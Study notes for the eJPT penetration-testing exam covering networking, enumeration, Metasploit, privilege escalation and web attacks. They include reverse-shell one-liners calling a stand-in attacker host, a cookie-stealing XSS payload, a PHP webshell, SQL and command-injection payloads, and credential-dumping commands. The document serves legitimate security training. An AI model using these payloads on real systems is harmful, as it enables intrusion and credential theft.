# INE Penetration Testing Student (PTS) — eJPT Exam Notes
> Complete study notes covering all modules in the INE PTS Learning Path

---

## TABLE OF CONTENTS
1. [Networking Fundamentals](#1-networking-fundamentals)
2. [Web Application Basics](#2-web-application-basics)
3. [Programming & Scripting Basics](#3-programming--scripting-basics)
4. [Penetration Testing Basics](#4-penetration-testing-basics)
5. [Host & Network Penetration Testing](#5-host--network-penetration-testing)
6. [Information Gathering & Reconnaissance](#6-information-gathering--reconnaissance)
7. [Scanning & Enumeration](#7-scanning--enumeration)
8. [Vulnerability Assessment](#8-vulnerability-assessment)
9. [Exploitation](#9-exploitation)
10. [Post-Exploitation](#10-post-exploitation)
11. [Web App Penetration Testing](#11-web-app-penetration-testing)
12. [Key Tools Quick Reference](#12-key-tools-quick-reference)
13. [eJPT Exam Tips](#13-ejpt-exam-tips)

---

## 1. NETWORKING FUNDAMENTALS

### OSI Model (7 Layers) — Remember: "Please Do Not Throw Sausage Pizza Away"
| Layer | Name | Protocol Examples |
|-------|------|-------------------|
| 7 | Application | HTTP, FTP, DNS, SMTP |
| 6 | Presentation | SSL/TLS, JPEG |
| 5 | Session | NetBIOS, RPC |
| 4 | Transport | TCP, UDP |
| 3 | Network | IP, ICMP, ARP |
| 2 | Data Link | Ethernet, MAC |
| 1 | Physical | Cables, Hubs |

### TCP/IP Model
- Application → Transport → Internet → Network Access

### TCP vs UDP
| TCP | UDP |
|-----|-----|
| Connection-oriented (3-way handshake) | Connectionless |
| Reliable, ordered | Faster, no guarantee |
| HTTP, FTP, SSH, SMTP | DNS, DHCP, VoIP |

### TCP 3-Way Handshake
```
Client → SYN → Server
Client ← SYN-ACK ← Server
Client → ACK → Server
```

### Important Port Numbers (MUST MEMORIZE)
| Port | Protocol/Service |
|------|-----------------|
| 21 | FTP |
| 22 | SSH |
| 23 | Telnet |
| 25 | SMTP |
| 53 | DNS |
| 80 | HTTP |
| 110 | POP3 |
| 139/445 | SMB/NetBIOS |
| 143 | IMAP |
| 443 | HTTPS |
| 3306 | MySQL |
| 3389 | RDP |
| 5985/5986 | WinRM |
| 8080 | HTTP Alternate |

### IP Addressing & Subnetting
- **IPv4**: 32-bit, dotted decimal (e.g., 192.168.1.1)
- **Private ranges**: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
- **CIDR notation**: /24 = 255.255.255.0 = 254 usable hosts
- **Loopback**: 127.0.0.1

### Common CIDR Ranges
| CIDR | Subnet Mask | Hosts |
|------|------------|-------|
| /24 | 255.255.255.0 | 254 |
| /25 | 255.255.255.128 | 126 |
| /16 | 255.255.0.0 | 65534 |
| /8 | 255.0.0.0 | 16M+ |

### Routing Concepts
- **Default Gateway**: Router IP that forwards traffic outside local network
- **ARP**: Maps IP → MAC address (Layer 2)
- `ip route` / `route -n` — view routing table
- `ip addr` / `ifconfig` — view network interfaces

---

## 2. WEB APPLICATION BASICS

### HTTP Methods
| Method | Use |
|--------|-----|
| GET | Retrieve data |
| POST | Submit data |
| PUT | Update/create resource |
| DELETE | Remove resource |
| HEAD | Headers only |
| OPTIONS | Allowed methods |

### HTTP Status Codes
| Code | Meaning |
|------|---------|
| 200 | OK |
| 301/302 | Redirect |
| 400 | Bad Request |
| 401 | Unauthorized |
| 403 | Forbidden |
| 404 | Not Found |
| 500 | Internal Server Error |

### HTTP Request Structure
```
GET /index.html HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=abc123
```

### Cookies & Sessions
- **Cookie**: Stored client-side, sent with each request
- **Session**: Server-side storage, cookie holds session ID
- Cookies can be **HttpOnly** (not accessible by JS) and **Secure** (HTTPS only)

### HTTPS & SSL/TLS
- Port 443
- Encrypts data in transit
- Uses certificates to verify identity

### DNS
- Resolves domain names → IP addresses
- **A record**: domain → IPv4
- **AAAA record**: domain → IPv6
- **MX record**: Mail server
- **CNAME**: Alias
- **NS record**: Nameserver

---

## 3. PROGRAMMING & SCRIPTING BASICS

### Bash Scripting Essentials
```bash
#!/bin/bash
# Variables
NAME="world"
echo "Hello $NAME"

# For loop
for i in $(seq 1 10); do
    echo $i
done

# Ping sweep
for ip in $(seq 1 254); do
    ping -c 1 192.168.1.$ip | grep "bytes from"
done

# Read file line by line
while read line; do
    echo $line
done < wordlist.txt
```

### Python Scripting Essentials
```python
import socket
import subprocess

# Simple port scanner
for port in range(1, 1025):
    s = socket.socket()
    s.settimeout(0.5)
    result = s.connect_ex(('192.168.1.1', port))
    if result == 0:
        print(f"Port {port} open")
    s.close()

# Run system commands
import subprocess
output = subprocess.run(['nmap', '-sV', '192.168.1.1'], capture_output=True)
print(output.stdout.decode())
```

---

## 4. PENETRATION TESTING BASICS

### Penetration Testing Phases
1. **Information Gathering** (Reconnaissance)
2. **Scanning & Enumeration**
3. **Vulnerability Assessment**
4. **Exploitation**
5. **Post-Exploitation** (Pivoting, Persistence, Loot)
6. **Reporting**

### Types of Penetration Testing
| Type | Description |
|------|-------------|
| Black Box | No prior knowledge of target |
| White Box | Full knowledge (source code, network diagrams) |
| Grey Box | Partial knowledge |

### Rules of Engagement (ROE)
- Written authorization is MANDATORY before testing
- Scope defines what is in/out of bounds
- Emergency contacts should be established
- Legal protection: explicit written permission

### Penetration Testing vs Vulnerability Assessment
- **Vuln Assessment**: Identifies vulnerabilities (no exploitation)
- **Pen Test**: Actively exploits vulnerabilities to prove impact

---

## 5. HOST & NETWORK PENETRATION TESTING

### Windows Key Concepts
- **SAM Database**: Stores hashed passwords (C:\Windows\System32\config\SAM)
- **NTLM Hash**: Windows password hash format
- **Active Directory**: Centralized auth for Windows domains
- **SMB**: File sharing protocol (ports 139, 445)
- **RDP**: Remote Desktop Protocol (port 3389)

### Linux Key Concepts
- **/etc/passwd**: User account info (world-readable)
- **/etc/shadow**: Password hashes (root-only)
- **SUID bit**: Allows execution as file owner
- **Cron jobs**: Scheduled tasks

### Important Windows Commands
```cmd
whoami                     # Current user
whoami /priv               # Privileges
net users                  # List users
net localgroup administrators  # Admin group
systeminfo                 # OS info, patches
ipconfig /all              # Network info
netstat -ano               # Active connections
tasklist                   # Running processes
dir /s /b *.txt            # Find .txt files
```

### Important Linux Commands
```bash
whoami; id                 # Current user/groups
uname -a                   # OS/kernel info
cat /etc/passwd            # User list
cat /etc/shadow            # Hashes (if root)
ps aux                     # Running processes
netstat -tulpn             # Open ports
find / -perm -4000 2>/dev/null  # SUID files
crontab -l                 # Cron jobs
sudo -l                    # Sudo permissions
history                    # Command history
```

---

## 6. INFORMATION GATHERING & RECONNAISSANCE

### Passive Reconnaissance (no direct contact)
- **WHOIS**: Domain registration info → `whois target.com`
- **Google Dorking**: Advanced search operators
- **Shodan.io**: Search engine for internet-connected devices
- **theHarvester**: Email, subdomain, host discovery
- **Maltego**: Visual link analysis
- **Netcraft**: Web server/technology info
- **LinkedIn/Social Media**: Employee info, technology stack

### Google Dork Operators (EXAM IMPORTANT)
```
site:target.com               # Pages on specific site
filetype:pdf site:target.com  # Find file types
intitle:"admin panel"         # Pages with specific title
inurl:admin                   # URLs with keyword
intext:"password"             # Pages with text
cache:target.com              # Cached version
```

### DNS Reconnaissance
```bash
# Basic lookup
nslookup target.com
dig target.com
dig target.com ANY         # All record types
dig target.com MX          # Mail records
dig target.com NS          # Nameservers

# Zone transfer (DNS enumeration)
dig axfr @ns1.target.com target.com

# Using host command
host -t mx target.com
host -t ns target.com
```

### theHarvester
```bash
theHarvester -d target.com -b all
theHarvester -d target.com -b google
theHarvester -d target.com -b linkedin
```

### Subdomain Enumeration
```bash
# Using sublist3r
sublist3r -d target.com

# Using gobuster
gobuster dns -d target.com -w /usr/share/wordlists/dns.txt

# Using amass
amass enum -d target.com
```

---

## 7. SCANNING & ENUMERATION

### Nmap — The Core Tool (MUST KNOW)

#### Scan Types
```bash
# Host discovery (ping sweep)
nmap -sn 192.168.1.0/24

# TCP SYN scan (stealth, default with root)
nmap -sS 192.168.1.1

# TCP Connect scan (no root needed)
nmap -sT 192.168.1.1

# UDP scan
nmap -sU 192.168.1.1

# All ports
nmap -p- 192.168.1.1

# Specific ports
nmap -p 22,80,443 192.168.1.1

# Version detection
nmap -sV 192.168.1.1

# OS detection
nmap -O 192.168.1.1

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.1

# Script scan
nmap -sC 192.168.1.1

# Most used combo
nmap -sV -sC -O -p- 192.168.1.1 -oN scan.txt
```

#### Nmap Output Formats
```bash
-oN output.txt    # Normal text
-oX output.xml    # XML
-oG output.gnmap  # Grepable
-oA output        # All formats
```

#### Nmap NSE Scripts
```bash
# Run default scripts
nmap -sC target.com

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users -p445 target

# HTTP enumeration
nmap --script http-enum -p80 target

# Vuln scanning
nmap --script vuln target

# FTP
nmap --script ftp-anon -p21 target
```

### Service-Specific Enumeration

#### FTP Enumeration (Port 21)
```bash
nmap -sV -p21 --script ftp-anon target
ftp target.com             # Connect
> anonymous               # Try anonymous login
> ls                      # List files
> get filename            # Download file
```

#### SSH Enumeration (Port 22)
```bash
nmap -p22 --script ssh-auth-methods target
ssh -v user@target        # Verbose connection
```

#### SMB Enumeration (Ports 139, 445) — HIGH PRIORITY
```bash
# Nmap SMB scripts
nmap -p445 --script smb-enum-shares,smb-enum-users target
nmap -p445 --script smb-vuln* target

# smbclient
smbclient -L //target -N                    # List shares (null session)
smbclient //target/share -N                 # Connect to share
smbclient //target/share -U username

# enum4linux — enumerate SMB/Windows info
enum4linux -a target
enum4linux -U target    # Users
enum4linux -S target    # Shares

# rpcclient
rpcclient -U "" target -N
> enumdomusers           # List users
> enumdomgroups          # List groups
> querydominfo           # Domain info
```

#### SMTP Enumeration (Port 25)
```bash
nmap -p25 --script smtp-enum-users,smtp-commands target

nc target 25
> VRFY username          # Verify user exists
> EXPN list              # Expand mailing list
```

#### HTTP/HTTPS Enumeration (Ports 80, 443)
```bash
# Directory busting
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
dirb http://target.com
dirsearch -u http://target.com

# Nikto — web server scanner
nikto -h http://target.com

# whatweb — identify technologies
whatweb target.com

# Curl tricks
curl -I target.com               # Headers only
curl -X OPTIONS target.com       # Allowed methods
```

#### MySQL Enumeration (Port 3306)
```bash
mysql -u root -p -h target
mysql -u root --password="" -h target   # No password
> show databases;
> use dbname;
> show tables;
> select * from users;
```

### Vulnerability Scanning
```bash
# OpenVAS / GVM — full-featured vuln scanner (GUI)

# Nessus — professional scanner

# Nmap vuln scripts
nmap --script vuln target

# searchsploit — find exploits for services
searchsploit apache 2.4.49
searchsploit -m exploits/linux/remote/12345.py
```

---

## 8. VULNERABILITY ASSESSMENT

### Common Vulnerability Types

#### Network Vulnerabilities
- Unpatched services (EternalBlue/MS17-010, BlueKeep)
- Default credentials
- Anonymous/guest access (FTP, SMB, SNMP)
- Weak encryption (TLS 1.0, RC4)

#### Web Vulnerabilities (OWASP Top 10)
1. **SQL Injection** — unsanitized input in SQL queries
2. **Cross-Site Scripting (XSS)** — JS injection in web pages
3. **Broken Authentication** — weak session management
4. **Insecure Direct Object Reference (IDOR)** — accessing unauthorized objects
5. **Security Misconfiguration** — default creds, open directories
6. **Sensitive Data Exposure** — unencrypted data
7. **XML External Entity (XXE)** — XML parser abuse
8. **Broken Access Control** — improper permissions
9. **Using Components with Known Vulnerabilities**
10. **Insufficient Logging & Monitoring**

### Searchsploit Usage
```bash
# Search for exploits
searchsploit vsftpd 2.3.4
searchsploit ms17-010
searchsploit windows smb

# Copy exploit to current directory
searchsploit -m linux/remote/1234.py

# Update database
searchsploit -u
```

---

## 9. EXPLOITATION

### Metasploit Framework — CRITICAL FOR EXAM

#### Basic Workflow
```bash
msfconsole                          # Start Metasploit
search ms17-010                     # Search exploits
use exploit/windows/smb/ms17_010_eternalblue
show options                        # Show required options
set RHOSTS 192.168.1.10             # Set target
set LHOST 192.168.1.5               # Set attacker IP
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run  (or exploit)                   # Execute
```

#### Useful Metasploit Commands
```bash
show exploits                       # All exploits
show payloads                       # All payloads
show auxiliary                      # Auxiliary modules
info                                # Info on current module
setg LHOST 192.168.1.5              # Set global variable
sessions -l                         # List sessions
sessions -i 1                       # Interact with session 1
background                          # Background current session
```

#### Common Metasploit Modules (EXAM LIKELY)
```bash
# EternalBlue - Windows SMB
exploit/windows/smb/ms17_010_eternalblue

# PSExec - pass-the-hash
exploit/windows/smb/psexec

# FTP vsftpd backdoor
exploit/unix/ftp/vsftpd_234_backdoor

# UnrealIRCd backdoor
exploit/unix/irc/unreal_ircd_3281_backdoor

# Tomcat Manager
exploit/multi/http/tomcat_mgr_upload

# ShellShock
exploit/multi/http/apache_mod_cgi_bash_env_exec

# Port scan auxiliary
auxiliary/scanner/portscan/tcp

# SMB login brute force
auxiliary/scanner/smb/smb_login

# FTP login brute force
auxiliary/scanner/ftp/ftp_login

# HTTP dir scanner
auxiliary/scanner/http/dir_scanner
```

### Meterpreter Commands — CRITICAL
```bash
# System info
sysinfo                    # OS, hostname
getuid                     # Current user
getpid                     # Process ID

# File system
ls                         # List directory
cd directory               # Change dir
pwd                        # Current dir
upload /local/file /remote/path
download /remote/file /local/path
cat file.txt               # Read file

# Process & privilege
ps                         # List processes
migrate PID                # Migrate to process
getsystem                  # Try to get SYSTEM
getprivs                   # List privileges
shell                      # Drop to shell

# Credential dumping
hashdump                   # Dump local hashes
load kiwi                  # Load mimikatz module
creds_all                  # Dump all credentials

# Network
portfwd add -l 3389 -p 3389 -r 192.168.2.10   # Port forwarding
route add 192.168.2.0/24 1                      # Add route
ifconfig                   # Network interfaces

# Persistence
run persistence -h         # Persistence options

# Post modules
run post/windows/gather/hashdump
run post/windows/gather/enum_logged_on_users
run post/multi/recon/local_exploit_suggester

# Screenshot & keylog
screenshot
keyscan_start
keyscan_dump
```

### Password Attacks

#### Hydra — Online Brute Force
```bash
# SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target
hydra -L users.txt -P passwords.txt ssh://target

# FTP
hydra -l admin -P passwords.txt ftp://target

# HTTP POST form
hydra -l admin -P passwords.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# RDP
hydra -l administrator -P passwords.txt rdp://target

# SMB
hydra -l admin -P passwords.txt smb://target
```

#### John the Ripper — Password Cracking
```bash
# Crack /etc/shadow
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Crack specific hash format
john --format=NT hashes.txt
john --format=md5crypt hashes.txt

# Show cracked passwords
john --show hashes.txt
```

#### Hashcat — GPU Password Cracking
```bash
hashcat -m 0 hash.txt rockyou.txt    # MD5
hashcat -m 1000 hash.txt rockyou.txt # NTLM
hashcat -m 1800 hash.txt rockyou.txt # SHA512crypt (Linux)
hashcat -m 0 hash.txt rockyou.txt -r rules/best64.rule
```

### Netcat — Swiss Army Knife
```bash
# Listen for connection
nc -lvnp 4444

# Connect to port
nc target 4444

# Send file
nc -lvnp 4444 > received.txt
nc target 4444 < file.txt

# Reverse shell (on target)
nc -e /bin/bash attacker_ip 4444

# Reverse shell alternative (no -e flag)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker 4444 > /tmp/f
```

### Reverse Shells Quick Reference
```bash
# Bash
bash -i >& /dev/tcp/attacker_ip/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("attacker_ip",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# PowerShell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("attacker_ip",4444);...
```

### Shell Upgrading (After getting shell)
```bash
# Python PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Full TTY
Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# Using script
script /dev/null -c bash
```

---

## 10. POST-EXPLOITATION

### Privilege Escalation

#### Linux Privilege Escalation
```bash
# Check sudo rights
sudo -l

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# World-writable files
find / -writable -type f 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# NFS shares (no_root_squash)
cat /etc/exports
showmount -e localhost

# Kernel exploits
uname -a   # Get kernel version
searchsploit linux kernel 4.4

# LinPEAS / LinEnum automated check
curl -L https://linpeas.sh | sh
```

#### GTFOBins — Exploiting Sudo/SUID
If sudo -l shows something like `(ALL) /usr/bin/find`:
```bash
sudo find . -exec /bin/bash \; -quit

# vim
sudo vim -c ':!/bin/bash'

# python
sudo python3 -c 'import os; os.system("/bin/bash")'

# nmap (older versions)
echo "os.execute('/bin/sh')" > /tmp/nmap.script
sudo nmap --script /tmp/nmap.script

# Refer to: https://gtfobins.github.io/
```

#### Windows Privilege Escalation
```bash
# Check current privs
whoami /priv
whoami /groups

# System info (check for missing patches)
systeminfo

# Running services
net start
sc query

# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows"

# WinPEAS
.\winPEAS.exe

# PowerShell execution policy bypass
powershell -ExecutionPolicy Bypass -File script.ps1
```

### Pivoting & Network Lateral Movement

#### Pivoting with Metasploit
```bash
# Add route through compromised host (session 1)
use post/multi/manage/autoroute
set SESSION 1
run

# Or manually
route add 192.168.2.0/24 1

# SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 5
run

# Then use proxychains
proxychains nmap -sT 192.168.2.10
proxychains curl http://192.168.2.10
```

#### Port Forwarding with Meterpreter
```bash
# Forward local port to remote service
portfwd add -l 3389 -p 3389 -r 192.168.2.10

# Now connect via localhost
rdesktop 127.0.0.1:3389
```

#### SSH Tunneling
```bash
# Local port forwarding
ssh -L 8080:192.168.2.10:80 user@pivot_host

# Dynamic (SOCKS proxy)
ssh -D 9050 user@pivot_host

# Then: proxychains nmap ...
```

### Data Exfiltration
```bash
# Netcat transfer
nc -lvnp 4444 > file.txt        # Receiver
nc target 4444 < file.txt       # Sender

# HTTP server (Python)
python3 -m http.server 8080     # Start server on attacker
wget http://attacker:8080/file  # Download on target
curl http://attacker:8080/file -o file

# Base64 encode/decode (for text-only channels)
base64 file.txt                 # Encode
echo "base64string" | base64 -d > file.txt  # Decode
```

### Password Credential Dumping
```bash
# Windows (Meterpreter)
hashdump
load kiwi
lsa_dump_sam
lsa_dump_secrets
creds_all

# Windows (standalone Mimikatz)
privilege::debug
sekurlsa::logonpasswords
lsadump::sam

# Linux
cat /etc/shadow
```

### Pass-the-Hash (Windows)
```bash
# Using psexec with hash
exploit/windows/smb/psexec
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:hash_here

# Using pth-winexe
pth-winexe -U 'DOMAIN/user%hash' //target cmd.exe

# Impacket psexec
python3 psexec.py -hashes :ntlmhash administrator@target
```

---

## 11. WEB APP PENETRATION TESTING

### SQL Injection

#### Detection
```
# Try in any input field:
'
''
` 
')
'))
1' OR '1'='1
1' OR '1'='1'--
1 OR 1=1--
```

#### Manual SQL Injection
```sql
-- Basic auth bypass
admin'--
' OR 1=1--
' OR 'a'='a

-- UNION-based (determine column count first)
' ORDER BY 1--    (increase until error)
' UNION SELECT NULL,NULL,NULL--

-- Extract data
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--
```

#### SQLMap — Automated SQL Injection
```bash
# Test URL
sqlmap -u "http://target.com/page?id=1"

# Test POST
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables
sqlmap -u "http://target.com/page?id=1" -D dbname --tables

# Dump table
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# With cookies
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"

# Level and risk
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3
```

### Cross-Site Scripting (XSS)
```html
<!-- Basic XSS payloads -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert('XSS')</script>
';alert('XSS')//

<!-- Cookie stealing -->
<script>document.location='http://attacker/steal?c='+document.cookie</script>
```

### Directory Traversal / Path Traversal
```
../../etc/passwd
../../../windows/win.ini
....//....//etc/passwd
%2e%2e%2f%2e%2e%2fetc%2fpasswd

# In URL
http://target.com/view?file=../../../../etc/passwd
```

### File Upload Vulnerabilities
```
# Bypass extension filters
shell.php → shell.php5, shell.phtml, shell.php.jpg
# Bypass content-type
Change Content-Type: application/octet-stream → image/jpeg
# PHP webshell
<?php system($_GET['cmd']); ?>
# Usage: http://target/uploads/shell.php?cmd=whoami
```

### Command Injection
```bash
# If user input is passed to system()
; whoami
| whoami
&& whoami
`whoami`
$(whoami)

# Test in URL
http://target.com/ping?ip=127.0.0.1;whoami
```

### Local/Remote File Inclusion (LFI/RFI)
```
# LFI
http://target.com/page?file=../../../../etc/passwd
http://target.com/page?file=../../../../etc/shadow
http://target.com/page?file=php://filter/convert.base64-encode/resource=/etc/passwd

# RFI (if allow_url_include=On)
http://target.com/page?file=http://attacker.com/shell.php

# Log poisoning → LFI to RCE
# 1. Inject PHP into User-Agent header (gets logged to access.log)
# 2. LFI to /var/log/apache2/access.log
```

### Burp Suite Usage (EXAM IMPORTANT)
- **Proxy**: Intercept & modify requests
- **Repeater**: Resend/modify requests manually
- **Intruder**: Fuzzing/brute force attacks
- **Scanner**: Automated vuln scanning (Pro)
- **Decoder**: Encode/decode (Base64, URL, etc.)
- **Comparer**: Diff two requests/responses

---

## 12. KEY TOOLS QUICK REFERENCE

### Network Tools
| Tool | Purpose | Example |
|------|---------|---------|
| nmap | Port scanning | `nmap -sV -sC target` |
| netdiscover | ARP host discovery | `netdiscover -r 192.168.1.0/24` |
| arp-scan | ARP scan | `arp-scan --localnet` |
| traceroute | Path tracing | `traceroute target` |
| wireshark | Packet capture/analysis | GUI |
| tcpdump | CLI packet capture | `tcpdump -i eth0 -w cap.pcap` |

### Web Tools
| Tool | Purpose | Example |
|------|---------|---------|
| nikto | Web vuln scanner | `nikto -h http://target` |
| gobuster | Dir/subdomain brute | `gobuster dir -u url -w wordlist` |
| dirb | Directory brute force | `dirb http://target` |
| sqlmap | SQL injection | `sqlmap -u "url?id=1" --dbs` |
| burpsuite | Web proxy/test | GUI |
| whatweb | Tech fingerprinting | `whatweb target.com` |
| curl | HTTP requests | `curl -I target.com` |

### Exploitation Tools
| Tool | Purpose | Example |
|------|---------|---------|
| metasploit | Exploitation framework | `msfconsole` |
| searchsploit | Exploit database search | `searchsploit vsftpd` |
| netcat | Networking Swiss knife | `nc -lvnp 4444` |
| hydra | Online brute force | `hydra -l user -P pass.txt ssh://target` |

### Password Tools
| Tool | Purpose | Example |
|------|---------|---------|
| john | Hash cracking | `john --wordlist=rockyou.txt hashes.txt` |
| hashcat | GPU hash cracking | `hashcat -m 1000 hash.txt wordlist` |
| hydra | Online brute force | `hydra -L users.txt -P pass.txt target ssh` |
| medusa | Online brute force | `medusa -h target -u admin -P pass.txt -M ssh` |

### Wordlists Location (Kali Linux)
```bash
/usr/share/wordlists/rockyou.txt              # Passwords
/usr/share/wordlists/dirb/common.txt          # Web directories
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/Usernames/                # Usernames
/usr/share/seclists/Discovery/Web-Content/   # Web content
```

---

## 13. eJPT EXAM TIPS

### Exam Format
- **20 questions** (multiple choice)
- **72 hours** to complete
- Practical lab-based exam
- You are given a VPN to connect to target network
- Open-book: you can use tools and the internet

### Key Things to Do on Exam
1. **Start with nmap scan** of the entire provided range
   ```bash
   nmap -sn 10.10.10.0/24   # Host discovery first
   nmap -sV -sC -p- 10.10.10.1 -oN host1.txt
   ```
2. **Check ALL hosts** in the network, not just one
3. **Look for SMB** (ports 139/445) — common exam target
4. **Try anonymous/null sessions** (FTP, SMB)
5. **Check HTTP** services for web vulns
6. **Run enum4linux** on Windows/SMB hosts
7. **Use Metasploit** for exploitation when possible
8. **Read ALL the questions first** — they hint at what to look for
9. **Try default credentials**: admin/admin, admin/password, root/root

### Common Exam Scenarios
- Find hidden hosts via routing (pivot scenario)
- EternalBlue / MS17-010 exploitation
- FTP anonymous access → file with credentials
- Web app SQLi or file upload
- Password cracking with john/hashcat
- SMB null session enumeration
- Privilege escalation via SUID or sudo

### Routing — EXAM CRITICAL
If the network diagram shows multiple subnets:
```bash
# Add route in Metasploit
route add 192.168.2.0/24 1   # After getting session

# Add route via OS
ip route add 192.168.2.0/24 via 10.10.10.1

# Check your routing table
ip route
route -n
```

### Wireshark for Exam
- Capture live traffic on lab VPN interface
- Filter: `http`, `ftp`, `smb`, `tcp.port==4444`
- Look for credentials in cleartext (FTP, Telnet, HTTP Basic Auth)
- Find flags or sensitive data in traffic

### Must-Know Exploit Summary
| Vulnerability | Affected | Metasploit Module |
|--------------|---------|------------------|
| MS17-010 (EternalBlue) | Windows 7/2008 | exploit/windows/smb/ms17_010_eternalblue |
| vsftpd 2.3.4 backdoor | Linux FTP | exploit/unix/ftp/vsftpd_234_backdoor |
| UnrealIRCd backdoor | Linux IRC | exploit/unix/irc/unreal_ircd_3281_backdoor |
| ShellShock (CVE-2014-6271) | Linux Apache | exploit/multi/http/apache_mod_cgi_bash_env_exec |
| Tomcat Manager Upload | Java Tomcat | exploit/multi/http/tomcat_mgr_upload |
| PSExec Pass-the-Hash | Windows | exploit/windows/smb/psexec |

### Flags Pattern
The exam will ask specific questions like:
- "What OS version is running on host X?"
- "What user is running on the FTP server?"
- "What is the content of file Y?"
- "What is the hash of user Z?"

Answer these by running scans and enumeration on ALL hosts.

---

## QUICK CHEATSHEET (Print This Out!)

```
PHASE 1 - DISCOVERY
nmap -sn 10.x.x.0/24                         # Find live hosts

PHASE 2 - SCAN
nmap -sV -sC -p- TARGET -oN scan.txt         # Full scan

PHASE 3 - ENUMERATE
enum4linux -a TARGET                           # SMB (Windows)
nikto -h http://TARGET                         # Web
ftp TARGET (anonymous login)                   # FTP

PHASE 4 - EXPLOIT
msfconsole → search → use → set → run        # Metasploit
sqlmap -u "URL?id=1" --dbs                    # SQLi
hydra -l admin -P rockyou.txt ssh://TARGET   # Brute force

PHASE 5 - POST EXPLOIT
meterpreter> sysinfo; getuid; hashdump       # Info
meterpreter> getsystem                       # Privesc
sudo -l / find / -perm -4000                 # Linux privesc
```

---
*Notes compiled from INE PTS Learning Path covering: Networking, Web Basics, Penetration Testing Fundamentals, Host & Network Testing, Web App Testing. Good luck on your eJPT exam!*
